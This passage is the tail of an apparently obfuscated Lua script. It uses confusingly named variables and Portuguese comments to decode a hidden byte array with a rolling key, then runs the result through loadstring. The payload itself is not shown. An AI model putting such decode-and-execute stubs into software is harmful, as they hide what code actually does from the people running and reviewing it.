    local function VM_I0l111Il(d, k, m)
        local R_1OlIO = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_1OlIO, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_1OlIO)
    end

    -- Execution Guard
    local F_IlO1l1 = loadstring(VM_I0l111Il(B_l0lIOOI, 72, 5))
    if F_IlO1l1 then
        F_IlO1l1(...)
    end
end)(...)
